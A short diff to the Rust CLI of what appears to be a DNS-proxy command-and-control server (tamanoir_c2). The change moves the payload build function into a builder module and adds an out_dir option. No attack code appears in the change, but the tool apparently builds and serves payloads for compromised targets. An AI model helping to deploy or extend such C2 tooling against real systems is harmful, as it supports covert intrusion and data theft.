@@ -3,7 +3,8 @@ use std::{collections::HashMap, net::Ipv4Addr, sync::Arc};
 use clap::{Parser, Subcommand};
 use log::{debug, info};
 use tamanoir_c2::{
-    handlers::{add_info, build, forward_req, init_keymaps, mangle, max_payload_length},
+    builder::build,
+    handlers::{add_info, forward_req, init_keymaps, mangle, max_payload_length},
     select_payload, Engine, Session, TargetArch,
 };
 use tamanoir_common::ContinuationByte;
@@ -22,10 +23,12 @@ enum Command {
         target_arch: TargetArch,
         #[clap(short, long, default_value = "docker")]
         engine: Engine,
-        #[clap(long)]
-        crate_path: String,
         #[clap(long, default_value = "")]
         build_vars: String,
+        #[clap(long)]
+        crate_path: String,
+        #[clap(long)]
+        out_dir: String,
     },
     // start the dns proxy / c2 server
     Start {
@@ -52,8 +55,9 @@ async fn main() -> anyhow::Result<()> {
             engine,
             crate_path,
             build_vars,
+            out_dir,
         } => {
-            if let Err(_) = build(crate_path, engine, target_arch, build_vars) {
+            if let Err(_) = build(crate_path, engine, target_arch, build_vars, out_dir) {
                 std::process::exit(1);
             }
         }
